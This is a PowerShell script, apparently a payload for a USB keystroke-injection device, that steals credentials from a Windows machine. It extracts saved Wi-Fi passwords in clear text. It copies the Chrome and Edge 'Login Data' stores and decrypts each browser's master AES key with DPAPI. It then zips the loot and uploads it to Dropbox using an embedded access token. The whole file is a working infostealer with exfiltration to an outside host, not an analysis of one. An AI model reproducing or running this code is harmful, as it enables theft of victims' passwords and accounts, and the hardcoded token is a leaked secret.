# $DRIVE = 'CURCUITPY'

# $duckletter = Get-WmiObject -Class Win32_Volume | Where-Object { $_.Label -eq $DRIVE } | Select-Object -ExpandProperty Name


# $destinationDir = "$duckletter\$env:USERNAME"

$TempPath = [System.IO.Path]::GetTempPath()
$FolderName = "$env:USERNAME-Hellow/hi"
$destinationDir = Join-Path -Path $TempPath -ChildPath $FolderName

Add-Type -AssemblyName System.Security


# Create the destination directory if it doesn't exist
if (-not (Test-Path -Path $destinationDir)) {
    New-Item -ItemType Directory -Path $destinationDir | Out-Null
}

function GetWifiPasswords {
    $wifiProfiles = netsh wlan show profiles | Select-String "\s:\s(.*)$" | ForEach-Object { $_.Matches[0].Groups[1].Value }

    $results = @()

    foreach ($profile in $wifiProfiles) {
        $profileDetails = netsh wlan show profile name="$profile" key=clear
        $keyContent = ($profileDetails | Select-String "Key Content\s+:\s+(.*)$").Matches.Groups[1].Value
        $results += [PSCustomObject]@{
            ProfileName = $profile
            KeyContent  = $keyContent
        }
    }

    $results | Format-Table -AutoSize

    # Save results to a file
    $results | Out-File -FilePath "$destinationDir\WiFi_Details.txt"
}

GetWifiPasswords

# Function to copy Login Data file
function Copy-LoginData {
    param (
        [string]$browserName,
        [string]$browserDataPath
    )

    $browserDir = Join-Path -Path $destinationDir -ChildPath $browserName
    if (-not (Test-Path -Path $browserDir)) {
        New-Item -ItemType Directory -Path $browserDir | Out-Null
    }

    # Copy Login Data file
    $loginDataPath = Join-Path -Path $browserDataPath -ChildPath "Default\Login Data"
    if (Test-Path -Path $loginDataPath) {
        Copy-Item -Path $loginDataPath -Destination $browserDir -Force
        Write-Output "$browserName Copied Login Data to $browserDir"
    } else {
        Write-Output "$browserName Login Data file not found."
    }
}

# Function to decrypt AES key from Local State
function Get-DecryptedAESKey {
    param (
        [string]$browserName,
        [string]$localStatePath
    )

    $browserDir = Join-Path -Path $destinationDir -ChildPath $browserName
    if (-not (Test-Path -Path $browserDir)) {
        New-Item -ItemType Directory -Path $browserDir | Out-Null
    }

    # Read and parse the Local State file
    $localStateContent = Get-Content -Path $localStatePath -Raw | ConvertFrom-Json

    # Extract and decode the encrypted key
    $encryptedKey = $localStateContent.os_crypt.encrypted_key
    $encryptedKeyBytes = [System.Convert]::FromBase64String($encryptedKey)

    # Remove the first 5 bytes (DPAPI prefix) and decrypt the key
    $decryptedKey = [System.Security.Cryptography.ProtectedData]::Unprotect(
        $encryptedKeyBytes[5..($encryptedKeyBytes.Length - 1)],
        $null,
        [System.Security.Cryptography.DataProtectionScope]::CurrentUser
    )

    # Convert the decrypted key to Base64 and save it to a file
    $decryptedKeyBase64 = [System.Convert]::ToBase64String($decryptedKey)
    $outputPathAES = Join-Path -Path $browserDir -ChildPath "AES.txt"
    Set-Content -Path $outputPathAES -Value $decryptedKeyBase64

    Write-Output "$browserName Decrypted AES Key saved to $outputPathAES"
    Write-Output "$browserName Decrypted AES Key: $decryptedKeyBase64"
}

# Process Microsoft Edge
$edgeDataPath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
$edgeLocalStatePath = Join-Path -Path $edgeDataPath -ChildPath "Local State"

Copy-LoginData -browserName "Edge" -browserDataPath $edgeDataPath
Get-DecryptedAESKey -browserName "Edge" -localStatePath $edgeLocalStatePath

# Process Google Chrome
$chromeDataPath = "$env:LOCALAPPDATA\Google\Chrome\User Data"
$chromeLocalStatePath = Join-Path -Path $chromeDataPath -ChildPath "Local State"

Copy-LoginData -browserName "Chrome" -browserDataPath $chromeDataPath
Get-DecryptedAESKey -browserName "Chrome" -localStatePath $chromeLocalStatePath

Write-Output "All files and keys saved to: $destinationDir"

$FolderName2 = "$env:USERNAME-Hellow/hi.zip"
$destinationZip = Join-Path -Path $TempPath -ChildPath $FolderName2
Compress-Archive -Path $destinationDir -DestinationPath $destinationZip

function UploadZipToDropbox {
    param (
        [string]$SourceFilePath,
        [string]$TargetFilePath,
        [string]$AccessToken
    )

    $url = "https://content.dropboxapi.com/2/files/upload"
    $headers = @{
        "Authorization" = "Bearer $AccessToken"
        "Dropbox-API-Arg" = (@{
            path = $TargetFilePath
            mode = "add"
            autorename = $true
            mute = $false
        } | ConvertTo-Json -Depth 10 -Compress)
        "Content-Type" = "application/octet-stream"
    }
    

    Invoke-RestMethod -Uri $url -Method Post -Headers $headers -InFile $SourceFilePath
}

# Example usage:
$AccessToken = "sl.u.AFmnZD1L8-KhgIedZhHtK1uarg4syLr4nM3DnBS2-1vfMH0--V2CZrdJIbvmrLLAMB0sAiH8QvDd9T9Jpi6a64ty3RaUeGEeM7cOF5hlQLPQjq6l2yXrXNU4UmQQ_iZrZQMvoEohzfUJwXWuIPw8psECFNZBdR6YChl5NODvj3xbpHzN60EFatZSg2yWmPw2L5TtwWzzSGzGcKFSTP8rglVW-Kubox-_QQ5JSYdoFf10IT16gt4MeB22HwYzYhIob3i1vLqHbWn-vBcePyJcC0WnZBCPruZFfdlwF9Rjek0-k4vviRLtMdXF5TUINhsWS41_XalpeuxDZajhCZAS1Fg74H_fuZVdY-f7Af3dJcSkqSo6AKzGG8y2JGCyI5tmY00cMIEcy0yRwPcq-99YRdgrbKwJwAW1Ng2tdL7CYsCNtdGHFT8pLywGrVh25TQ4fAMhlO5CPvxmGsAvq0O8dUImGOZrF2boAcZnBz9JjoM4y5qh8zLUZX5OtLZhsf--9ulhmYnS50b49BqA0YqIuOwsgtDenRrRO30Ygqec6T4z2l4QLMz4D9vazre-zT5_oIb0UQKk-Fsrhoc3_ZuWEaPowlAVAjxBdGpYDJmJF4bb_GgSRW7AcRl-J8Na4qNdpRew-FkR_RqSyzhtlYcmFGGW677qjEFur19K9qRc5FHBcP6rbiV_Y038-L0DTC3WaF-DZxfX3UMp6gXnbZkPowYb6tVjglO82y5iRr03AzA39nk4RnKOHMbRaqFlrxe6C5dcCCy3gsp-PSG66ANzOyKuEw3y9tuAbsa_YIyXC692QscAoVD0DNbmb4ee6nbvy-uq39cGqRiq5jJmO0urLBuCvPtBvCcxEIQfw3K0J22sDyDtPLZcLvEOlZ70fay-A6Qhe6VeUJKuG64J981bvXCidKMoMme6xQH53snPFvt1JoKAFGd-8M-6suG-54_yPY1jiV-TI42RvKxuzRObDbfiPhY_eU3KhCPa2s6IXIJqzy8DYjn9dvUyU-kgPeJgnXV3T4VwSFUSxaB_UVqFDJn_jYrLI9ZvN0PhFThgIoUoKwJtKbMOqkKFhN5n3tI-7sTZxVibe7dsF2GYBJRdTDtB85U2q5xDfalWGR0V25JJsYx3RWbunSmNK-d9CBqcgo7dlsnbldNvjUSGvOEJLt3lQQqIwrUhizrq0mEdXXcdNBbxizXWQHpT8_MBDIeNB7tm-1dx-S7wGMMNKRuNEZbs0C66R-YGFzp-_WB8c7W2SetcvZ8v15hl8YgWuz86ckv0aMiSkfBw_iRSvGtSLaFgI5Ly33gVPmS61posr_7Z_3gSKQ_YTjDx3bcb5udlYV5k6Bv_dIa4VjLTNfyvC3kBwYODaFyElTSqXqHnEPII0Urc9vEGuAQ7K8ZLq7pPO2e_99srJYvcxkWFxupclwGk"
$currentDate = Get-Date -Format "yyyy-MM-dd"
$currentTime = Get-Date -Format "HH:mm:ss"
$TargetFilePath = "/$env:USERNAME-$currentDate-$currentTime.zip"

UploadZipToDropbox -SourceFilePath $destinationZip -TargetFilePath $TargetFilePath -AccessToken $AccessToken
